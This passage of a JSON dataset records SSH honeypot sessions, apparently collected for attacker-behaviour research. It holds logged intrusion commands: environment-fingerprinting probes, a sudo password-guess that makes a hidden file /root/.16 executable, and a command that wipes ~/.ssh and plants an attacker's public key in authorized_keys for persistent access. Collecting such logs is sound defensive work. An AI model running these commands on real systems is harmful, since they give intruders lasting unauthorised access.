value'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'; printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s|%s|%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$#\" \"$1\" \"$2\"'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_6_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_7_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b() { printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'arg=%s|count=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$1\" \"$#\"; }; f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'; printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"''\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_7_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_8_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' >&2; exit 37'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_8_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_done'\"'\"'\"'\"'\"'\"'\"'\"'; printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_stderr'\"'\"'\"'\"'\"'\"'\"'\"' >&2'\"'\"'; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_9a7d2ac469236a537b2cbfaee305f4a8_end'\"'\"' \"$_filter_status\"' 2>&1",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 2.68,
+        "think_time_bin": "medium",
+        "cumulative_time_s": 2.93,
+        "task_progress": 0.62
+      },
+      {
+        "step": 10,
+        "command": "printf '\\n%s\\n' 'check_9a7d2ac469236a537b2cbfaee305f4a8_begin'; sh -c 'printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_control'\"'\"'; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_0_begin'\"'\"'; sh -c '\"'\"'if IFS='\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '\"'\"'\"'\"'\"'\"'\"'\"'%s|%s|%s|%s|%s|%s|%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b:NA'\"'\"'\"'\"'\"'\"'\"'\"'; fi'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_0_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_1_begin'\"'\"'; sh -c '\"'\"'if IFS='\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '\"'\"'\"'\"'\"'\"'\"'\"'%s|%s|%s|%s|%s|%s|%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_ff1270dd332e49f83ae0f286d7186c6e'\"'\"'\"'\"'\"'\"'\"'\"' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_ff1270dd332e49f83ae0f286d7186c6e:NA'\"'\"'\"'\"'\"'\"'\"'\"'; fi'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_1_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_2_begin'\"'\"'; sh -c '\"'\"'value=$((19+23)); if [ \"$value\" -eq 42 ]; then printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"' \"$value\" '\"'\"'\"'\"'\"'\"'\"'\"'branch-ok'\"'\"'\"'\"'\"'\"'\"'\"'; else exit 9; fi'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_2_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_3_begin'\"'\"'; sh -c '\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"' | while IFS= read -r line; do printf '\"'\"'\"'\"'\"'\"'\"'\"'pipe=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' \"$line\"; done'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_3_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_4_begin'\"'\"'; sh -c '\"'\"'v=outer; (v=inner; printf '\"'\"'\"'\"'\"'\"'\"'\"'child=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' \"$v\"); printf '\"'\"'\"'\"'\"'\"'\"'\"'parent=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' \"$v\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_4_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_5_begin'\"'\"'; sh -c '\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'a b;$()'\"'\"'\"'\"'\"'\"'\"'\"''\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_5_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_6_begin'\"'\"'; sh -c '\"'\"'set -- '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'second value'\"'\"'\"'\"'\"'\"'\"'\"'; printf '\"'\"'\"'\"'\"'\"'\"'\"'%s|%s|%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' \"$#\" \"$1\" \"$2\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_6_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_7_begin'\"'\"'; sh -c '\"'\"'f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b() { printf '\"'\"'\"'\"'\"'\"'\"'\"'arg=%s|count=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' \"$1\" \"$#\"; }; f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'; printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"''\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_7_end'\"'\"' \"$_filter_status\"; printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_8_begin'\"'\"'; sh -c '\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"' >&2; exit 37'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\\n%s:%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_8_end'\"'\"' \"$_filter_status\"; printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_done'\"'\"'; printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_stderr'\"'\"' >&2'; _filter_status=$?; printf '\\n%s:%s\\n' 'check_9a7d2ac469236a537b2cbfaee305f4a8_end' \"$_filter_status\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 2.12,
+        "think_time_bin": "medium",
+        "cumulative_time_s": 5.05,
+        "task_progress": 0.69
+      },
+      {
+        "step": 11,
+        "command": "printf '%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_control'; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_0_begin'; sh -c 'if IFS='\"'\"' '\"'\"' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '\"'\"'%s|%s|%s|%s|%s|%s|%s\\n'\"'\"' '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b:NA'\"'\"'; fi' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_0_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_1_begin'; sh -c 'if IFS='\"'\"' '\"'\"' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '\"'\"'%s|%s|%s|%s|%s|%s|%s\\n'\"'\"' '\"'\"'check_ff1270dd332e49f83ae0f286d7186c6e'\"'\"' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_ff1270dd332e49f83ae0f286d7186c6e:NA'\"'\"'; fi' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_1_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_2_begin'; sh -c 'value=$((19+23)); if [ \"$value\" -eq 42 ]; then printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"' \"$value\" '\"'\"'branch-ok'\"'\"'; else exit 9; fi' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_2_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_3_begin'; sh -c 'printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"' | while IFS= read -r line; do printf '\"'\"'pipe=%s\\n'\"'\"' \"$line\"; done' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_3_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_4_begin'; sh -c 'v=outer; (v=inner; printf '\"'\"'child=%s\\n'\"'\"' \"$v\"); printf '\"'\"'parent=%s\\n'\"'\"' \"$v\"' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_4_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_5_begin'; sh -c 'printf '\"'\"'%s\\n'\"'\"' '\"'\"'a b;$()'\"'\"'' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_5_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_6_begin'; sh -c 'set -- '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"' '\"'\"'second value'\"'\"'; printf '\"'\"'%s|%s|%s\\n'\"'\"' \"$#\" \"$1\" \"$2\"' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_6_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_7_begin'; sh -c 'f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b() { printf '\"'\"'arg=%s|count=%s\\n'\"'\"' \"$1\" \"$#\"; }; f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'; printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_7_end' \"$_filter_status\"; printf '\\n%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_8_begin'; sh -c 'printf '\"'\"'%s\\n'\"'\"' '\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"' >&2; exit 37' 2>&1; _filter_status=$?; printf '\\n%s:%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_8_end' \"$_filter_status\"; printf '%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_done'; printf '%s\\n' 'check_97929363f6f800c651efb0cfe62fd4cf_stderr' >&2",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.87,
+        "think_time_bin": "short",
+        "cumulative_time_s": 5.93,
+        "task_progress": 0.75
+      },
+      {
+        "step": 12,
+        "command": "if IFS=' ' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '%s|%s|%s|%s|%s|%s|%s\\n' 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '%s\\n' 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b:NA'; fi",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.54,
+        "think_time_bin": "short",
+        "cumulative_time_s": 6.46,
+        "task_progress": 0.81
+      },
+      {
+        "step": 13,
+        "command": "read -r _filter_pid _filter_rest",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.26,
+        "think_time_bin": "short",
+        "cumulative_time_s": 6.72,
+        "task_progress": 0.88
+      },
+      {
+        "step": 14,
+        "command": "if IFS=' ' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '%s|%s|%s|%s|%s|%s|%s\\n' 'check_ff1270dd332e49f83ae0f286d7186c6e' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '%s\\n' 'check_ff1270dd332e49f83ae0f286d7186c6e:NA'; fi",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 6.72,
+        "task_progress": 0.94
+      },
+      {
+        "step": 15,
+        "command": "read -r _filter_pid _filter_rest",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.21,
+        "think_time_bin": "short",
+        "cumulative_time_s": 6.94,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00005",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 12,
+    "session_duration_s": 146.87,
+    "data_source": "cowrie_wild",
+    "src_ip": "195.178.110.217",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "value=$((19+23)); if [ \"$value\" -eq 42 ]; then printf '%s\\n' 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b' \"$value\" 'branch-ok'; else exit 9; fi",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.08
+      },
+      {
+        "step": 1,
+        "command": "printf '%s\\n' 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b' | while IFS= read -r line; do printf 'pipe=%s\\n' \"$line\"; done",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.04,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.04,
+        "task_progress": 0.17
+      },
+      {
+        "step": 2,
+        "command": "read -r line",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.06,
+        "task_progress": 0.25
+      },
+      {
+        "step": 3,
+        "command": "v=outer; (v=inner; printf 'child=%s\\n' \"$v\"); printf 'parent=%s\\n' \"$v\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.06,
+        "task_progress": 0.33
+      },
+      {
+        "step": 4,
+        "command": "printf '%s\\n' 'a b;$()'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.08,
+        "task_progress": 0.42
+      },
+      {
+        "step": 5,
+        "command": "set -- 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b' 'second value'; printf '%s|%s|%s\\n' \"$#\" \"$1\" \"$2\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.01,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.09,
+        "task_progress": 0.5
+      },
+      {
+        "step": 6,
+        "command": "f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b() { printf 'arg=%s|count=%s\\n' \"$1\" \"$#\"; }; f_check_6b577bfd5f25c2b1b7658c5ac8f5b92b 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'; printf '%s\\n' 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.11,
+        "task_progress": 0.58
+      },
+      {
+        "step": 7,
+        "command": "printf '%s\\n' 'check_6b577bfd5f25c2b1b7658c5ac8f5b92b' >&2; exit 37",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.14,
+        "task_progress": 0.67
+      },
+      {
+        "step": 8,
+        "command": "echo; echo 'check_de6683f5536c523dabe0d9ff4ada73b5_transport_done'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.16,
+        "task_progress": 0.75
+      },
+      {
+        "step": 9,
+        "command": "echo '!root' | sudo -S sh -c 'chmod +x '\\''/root/.16'\\''' || echo '!root' | sudo -S chmod +x '/root/.16' || sh -c 'chmod +x '\\''/root/.16'\\''' || chmod +x '/root/.16'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 146.61,
+        "think_time_bin": "very_long",
+        "cumulative_time_s": 146.77,
+        "task_progress": 0.83
+      },
+      {
+        "step": 10,
+        "command": "chmod +x '/root/.16'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.08,
+        "think_time_bin": "short",
+        "cumulative_time_s": 146.85,
+        "task_progress": 0.92
+      },
+      {
+        "step": 11,
+        "command": "chmod +x '/root/.16'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 146.87,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00006",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 8.44,
+    "data_source": "cowrie_wild",
+    "src_ip": "27.155.103.100",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.01,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.01,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
